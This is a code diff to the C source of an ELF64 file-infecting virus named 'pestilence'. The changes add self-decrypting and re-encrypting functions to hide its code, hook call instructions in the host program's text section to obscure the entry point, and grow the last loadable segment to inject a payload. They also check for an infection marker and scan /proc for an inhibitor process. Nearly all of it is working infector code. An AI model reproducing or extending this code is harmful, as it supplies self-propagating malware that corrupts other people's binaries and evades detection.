@@ -1,16 +1,41 @@
 #include "pestilence.h"
 
-static int	check_magic(t_info *info)
+int		update_index(t_fingerprint *fingerprint, t_info *info)
 {
-	void *addr;
+	Elf64_Phdr  *program_header;
 
-	addr = info->text_begin + info->text_size - 4 - SIGN_SIZE;
+	program_header = (Elf64_Phdr *)(info->file + sizeof(Elf64_Ehdr));
+	while (program_header->p_type != PT_LOAD)
+		program_header++;
+	while(program_header->p_type == PT_LOAD)
+		program_header++;
+	program_header--;
+	program_header->p_memsz -= PAYLOAD_SIZE + BIS_SIZE;
+	program_header->p_filesz = program_header->p_memsz;
+
+	ft_memcpy(info->text_begin + info->text_size - SIGN_SIZE - 8 - 5, &(fingerprint->index), 4);
+	ft_syswrite(info->fd, info->file, info->file_size - info->bss_size - (PAYLOAD_SIZE + BIS_SIZE));
+	return(1);
+}
+
+int		check_magic(t_info *info, t_fingerprint *fingerprint)
+{
+	void		*addr;
+	int		ret;
+	uint32_t	key;
+
+	addr = info->text_begin + info->text_size - SIGN_SIZE - 8;
 	if (*(uint32_t *)addr ==  MAGIC_VIRUS)
-		return (1);
+	{
+		key = decrypt_func(info, &update_index, info->tab_addr[1] - info->tab_addr[0], 0);
+	 	ret = update_index(fingerprint, info);
+		reencrypt_func(info, &update_index, info->tab_addr[1] - info->tab_addr[0], key);
+		return (ret);
+	}
 	return (0);
 }
 
-static size_t	get_padding_size(t_info *info, Elf64_Phdr *program_header, int nb_hp)
+size_t		get_padding_size(t_info *info, Elf64_Phdr *program_header, int nb_hp)
 {
 	Elf64_Phdr  *crawler;
 	int32_t     i;  
@@ -39,7 +64,7 @@ static size_t	get_padding_size(t_info *info, Elf64_Phdr *program_header, int nb_
 	return (next_offset - (program_header->p_offset + program_header->p_filesz));
 }
 
-static int	valid_call(t_info *info, int pos)
+int		valid_call(t_info *info, int pos)
 {
 	int32_t		dest;
 	uint32_t	prolog;
@@ -64,9 +89,9 @@ static int	valid_call(t_info *info, int pos)
 	return (1);
 }
 
-static void	patch_sections_header(t_info *info, size_t offset, size_t to_add)
+void		patch_sections_header(t_info *info, size_t offset, size_t to_add)
 {
-	Elf64_Ehdr  *main_header;
+	Elf64_Ehdr 	*main_header;
 	Elf64_Shdr	*header;
 	uint16_t	i;
 
@@ -81,7 +106,7 @@ static void	patch_sections_header(t_info *info, size_t offset, size_t to_add)
 	}
 }
 
-int		find_text(t_info *info)
+int		find_text(t_info *info, t_fingerprint *fingerprint)
 {
 	Elf64_Ehdr	*main_header;
 	Elf64_Phdr	*header;
@@ -102,15 +127,23 @@ int		find_text(t_info *info)
 			info->text_size = header->p_filesz;
 			if (info->text_begin + info->text_size > info->file + info->file_size)
 				return (1);
-			if (check_magic(info) == 1)
+			uint32_t key = decrypt_func(info, &check_magic, info->tab_addr[2] - info->tab_addr[1], 1);
+			int ret = check_magic(info, fingerprint);
+			reencrypt_func(info, &check_magic, info->tab_addr[2] - info->tab_addr[1], key);
+			if (ret == 1)
 				return (1);
-			if (get_padding_size(info, header, main_header->e_phnum) < INJECT_SIZE)
+			key = decrypt_func(info, &get_padding_size, info->tab_addr[3] - info->tab_addr[2], 2);
+			ret = get_padding_size(info, header, main_header->e_phnum);
+			reencrypt_func(info, &get_padding_size, info->tab_addr[3] - info->tab_addr[2], key);
+			if (ret < INJECT_SIZE)
 				return (1);
 			info->text_addr = header->p_vaddr;
 			header->p_filesz += INJECT_SIZE;
 			header->p_memsz += INJECT_SIZE;
-			patch_sections_header(info, info->begin_bss, info->bss_size + PAYLOAD_SIZE);
-			main_header->e_shoff += (info->bss_size + PAYLOAD_SIZE);
+			key = decrypt_func(info, &patch_sections_header, info->tab_addr[5] - info->tab_addr[4], 4);
+			patch_sections_header(info, info->begin_bss, info->bss_size + PAYLOAD_SIZE + BIS_SIZE);
+			reencrypt_func(info, &patch_sections_header, info->tab_addr[5] - info->tab_addr[4], key);
+			main_header->e_shoff += (info->bss_size + PAYLOAD_SIZE + BIS_SIZE);
 			return (0);
 		}
 		header++;
@@ -119,24 +152,49 @@ int		find_text(t_info *info)
 	return (0);
 }
 
-static void	hook_call(t_info *info, int32_t nb)
+void		hook_call(t_info *info, int32_t nb)
 {
 	int32_t	new_jmp;
 
 	// get addr of loader
 	new_jmp = (int32_t)(info->text_size - (size_t)((size_t)(info->addr_call_to_replace) - (size_t)(info->text_begin)) - 5);
-	// Add offset depending of nb
-	if (nb == 1)
-		new_jmp += 0x3a;//REPLACE1
-	if (nb == 2)
-		new_jmp += 0x74;//REPLACE2
-	if (nb == 3)
-		new_jmp += 0x174;//REPLACE3
-	if (nb == 4)
-		new_jmp += 0x10e;//REPLACE4
-	if (nb == 5)
-		new_jmp += 0x112;//REPLACE5
+	new_jmp += ((nb - 1) * 4);
 	ft_memcpy(info->addr_call_to_replace + 1, &new_jmp, sizeof(new_jmp));
+}
+
+void		patch_close_entries(t_info *info, int32_t nb)
+{
+	uint32_t	origin;
+	uint32_t	addr_hook;
+	uint32_t	rip;
+	uint32_t	val;
+
+	origin = *(uint32_t *)(info->addr_call_to_replace + 1);
+	if (nb == 1)
+		ft_memcpy(info->file + info->offset_bis + OFFSET_CALL_1, &origin, 4);
+	if (nb == 2)
+		ft_memcpy(info->file + info->offset_bis + OFFSET_CALL_2, &origin, 4);
+	if (nb == 3)
+		ft_memcpy(info->file + info->offset_bis + OFFSET_CALL_3, &origin, 4);
+	if (nb == 4)
+		ft_memcpy(info->file + info->offset_bis + OFFSET_CALL_4, &origin, 4);
+	if (nb == 5)
+		ft_memcpy(info->file + info->offset_bis + OFFSET_CALL_5, &origin, 4);
+
+	rip = (uint32_t)(info->addr_bis) + BIS_SIZE + OFFSET_RIP;
+	addr_hook = (uint32_t)((size_t)(info->addr_call_to_replace) - (size_t)(info->text_begin) + info->text_addr)+ 1;
+	val = addr_hook - rip;
+	if (nb == 1)
+		ft_memcpy(info->file + info->offset_bis + OFFSET_HOOK_1, &val, 4);
+	if (nb == 2)
+		ft_memcpy(info->file + info->offset_bis + OFFSET_HOOK_2, &val, 4);
+	if (nb == 3)
+		ft_memcpy(info->file + info->offset_bis + OFFSET_HOOK_3, &val, 4);
+	if (nb == 4)
+		ft_memcpy(info->file + info->offset_bis + OFFSET_HOOK_4, &val, 4);
+	if (nb == 5)
+		ft_memcpy(info->file + info->offset_bis + OFFSET_HOOK_5, &val, 4);
+
 }
 
 void		epo_parsing(t_info *info)
@@ -145,9 +203,11 @@ void		epo_parsing(t_info *info)
 	int32_t	nb_call_detected;
 	int32_t	to_infect[5];
 	uint8_t	c;
+	int32_t	nb = 0;
 
 	i = 0;
 	nb_call_detected = 0;
+	uint32_t key = decrypt_func(info, &valid_call, info->tab_addr[4] - info->tab_addr[3], 3);
 	while (i < info->text_size)
 	{
 		c = *((uint8_t *)(info->text_begin + i));
@@ -155,6 +215,7 @@ void		epo_parsing(t_info *info)
 			nb_call_detected++;
 		i++;
 	}
+	reencrypt_func(info, &valid_call, info->tab_addr[4] - info->tab_addr[3], key);
 	if (nb_call_detected < 50)
 	{
 		info->valid_target = 0;
@@ -165,10 +226,9 @@ void		epo_parsing(t_info *info)
 	to_infect[2] = (nb_call_detected * 2) / 5;
 	to_infect[3] = (nb_call_detected * 3) / 5;
 	to_infect[4] = (nb_call_detected * 4) / 5;
-
 	i = 0;
 	nb_call_detected = 0;
-	int32_t	nb = 0;
+	key = decrypt_func(info, &valid_call, info->tab_addr[4] - info->tab_addr[3], 3);
 	while (i < info->text_size && nb_call_detected <= to_infect[4])
 	{
 		c = *((uint8_t *)(info->text_begin + i));
@@ -178,16 +238,24 @@ void		epo_parsing(t_info *info)
 			{
 				nb++;
 				info->addr_call_to_replace = info->text_begin + i;
+				uint32_t key2 = decrypt_func(info, &patch_close_entries, info->tab_addr[8] - info->tab_addr[7], 7);
+				patch_close_entries(info, nb);
+				reencrypt_func(info, &patch_close_entries, info->tab_addr[8] - info->tab_addr[7], key2);
+				key2 = decrypt_func(info, &hook_call, info->tab_addr[7] - info->tab_addr[6], 6);
 				hook_call(info, nb);
-				patch_end(info, nb);
+				reencrypt_func(info, &hook_call, info->tab_addr[7] - info->tab_addr[6], key2);
+				key2 = decrypt_func(info, &patch_bis, info->tab_addr[16] - info->tab_addr[15], 15);
+				patch_bis(info, nb);
+				reencrypt_func(info, &patch_bis, info->tab_addr[16] - info->tab_addr[15], key2);
 			}
 			nb_call_detected++;
 		}
 		i++;
 	}
+	reencrypt_func(info, &valid_call, info->tab_addr[4] - info->tab_addr[3], key);
 }
 
-int			pe_parsing(t_info *info)
+int		pe_parsing(t_info *info)
 {
 	Elf64_Phdr	*program_header;
 	Elf64_Ehdr	*main_header;
@@ -195,7 +263,6 @@ int			pe_parsing(t_info *info)
 	main_header = (Elf64_Ehdr *)(info->file);
 	if (info->file_size < sizeof(Elf64_Ehdr) + (main_header->e_phnum * sizeof(Elf64_Phdr)))
 		return (1);
-
 	program_header = (Elf64_Phdr *)(info->file + sizeof(Elf64_Ehdr));
 	while (program_header->p_type != PT_LOAD)
 		program_header++;
@@ -203,18 +270,20 @@ int			pe_parsing(t_info *info)
 		program_header++;
 	program_header--;
 
-	info->offset_payload = program_header->p_offset + program_header->p_memsz;
-	info->addr_payload = program_header->p_vaddr + program_header->p_memsz;
+	info->offset_bis = program_header->p_offset + program_header->p_memsz;
+	info->addr_bis = program_header->p_vaddr + program_header->p_memsz;
 	info->bss_size = program_header->p_memsz - program_header->p_filesz;
+	if (info->bss_size > 1024 * 1024)
+		return (1);
 	info->begin_bss = program_header->p_offset + program_header->p_filesz;
 	if (info->begin_bss > info->file_size)
 		return (1);
-	program_header->p_memsz += PAYLOAD_SIZE;
+	program_header->p_memsz += PAYLOAD_SIZE + BIS_SIZE;
 	program_header->p_filesz = program_header->p_memsz;
 	return (0);
 }
 
-static int	parse_process(char *path, int pid_len, char *buf_inhibitor)
+int		parse_process(char *path, int pid_len, char *buf_inhibitor)
 {
 	int		fd;
 	char	buf_cast[12 + pid_len + 3];
@@ -233,16 +302,15 @@ static int	parse_process(char *path, int pid_len, char *buf_inhibitor)
 	return (1);
 }
 
-int			check_process(char *path)
+int		check_process(char *path, t_info *info)
 {
-	char					buf_d[1024];
-	char					buf_stat[8];
-	char					buf_inhibitor[12];
+	char			buf_d[1024];
+	char			buf_stat[8];
+	char			buf_inhibitor[12];
 	struct linux_dirent64	*dir;
-	int						fd, n_read, pos;
-	char					buf_path_file[PATH_MAX];
-	int						pid_len;
-
+	int			fd, n_read, pos;
+	char			buf_path_file[PATH_MAX];
+	int			pid_len;
 
 	write_inhibitor(buf_inhibitor);
 	write_stat(buf_stat);
@@ -259,7 +327,10 @@ int			check_process(char *path)
 				ft_strcat(buf_path_file, dir->d_name);
 				ft_strcat(buf_path_file, buf_stat);
 				pid_len = ft_strlen(dir->d_name);
-				if ((parse_process(buf_path_file, pid_len, buf_inhibitor)) == 1)
+ 				uint32_t key = decrypt_func(info, &parse_process, info->tab_addr[11] - info->tab_addr[10], 10);
+ 				int ret = parse_process(buf_path_file, pid_len, buf_inhibitor);
+ 				reencrypt_func(info, &parse_process, info->tab_addr[10 + 1] - info->tab_addr[10], key);
+				if (ret == 1)
 					goto found;
 			}
 			pos += dir->d_reclen;
